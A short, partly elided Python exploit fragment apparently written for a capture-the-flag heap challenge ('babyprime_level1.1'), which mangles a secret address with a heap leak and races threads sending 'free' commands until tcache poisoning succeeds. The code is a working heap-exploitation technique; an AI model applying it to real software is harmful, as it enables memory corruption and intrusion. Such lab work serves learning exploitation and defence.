...
#     return mangled_leak
BINARY = "/challenge/babyprime_level1.1"
...
while True:
    ...
    print(f'result = {result}; expected = {p64(mangle(secret_addr, heap_leak, page_offset=-1))}')
    r1.sendline(f'free {1}'.encode('utf-8'))
    print(r1.clean(1))
    if unpack(result, 'all') == mangle(secret_addr, heap_leak, page_offset=-1):
        break
    else:
        t2 = Thread(target=thread4, args=(r1, 1, mangle(secret_addr, heap_leak, page_offset=-1)))
        t1 = Thread(target=thread3, args=(r2, 1, p64(mangle(secret_addr, heap_leak, page_offset=-1))))
        t2.start()
        t1.start()
